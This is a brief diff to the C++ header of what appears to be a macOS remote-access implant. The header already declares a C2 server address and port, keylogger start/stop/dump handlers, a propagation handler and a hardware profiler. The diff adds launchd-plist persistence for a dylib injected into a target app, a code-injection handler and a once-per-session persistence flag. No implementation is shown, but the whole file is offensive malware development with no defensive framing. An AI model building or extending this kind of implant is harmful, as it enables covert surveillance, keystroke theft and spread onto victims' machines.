@@ -44,6 +44,10 @@ public:
                                    const std::string& server_ip = "127.0.0.1",
                                    uint16_t server_port = 4242);
 
+    // Tier 2 persistence — launchd plist for injected dylib inside target app
+    static void persistInjectedAgent(const std::string& server_ip,
+                                     uint16_t server_port);
+
 private:
     // FSM Handlers
     void handleInit();
@@ -57,6 +61,7 @@ private:
     void handleKeylogStop();
     void handleKeylogDump();
     void handlePropagation(Packet&& packet);
+    void handleInjection(Packet&& packet);
 
     // System Profiler (Gourmandise Subsystem)
     std::string getHardwareUUID();
@@ -87,6 +92,9 @@ private:
     // Shared buffer: jitter thread stores here, PONG handler picks up
     std::string              m_keylog_pending_data;
     std::mutex               m_keylog_pending_mutex;
+
+    // Persistence guard — write plist only once per session
+    bool m_persistence_installed;
 
     // Reconnect backoff (Phase 2.2)
     static constexpr unsigned MIN_BACKOFF  = 1;     // seconds
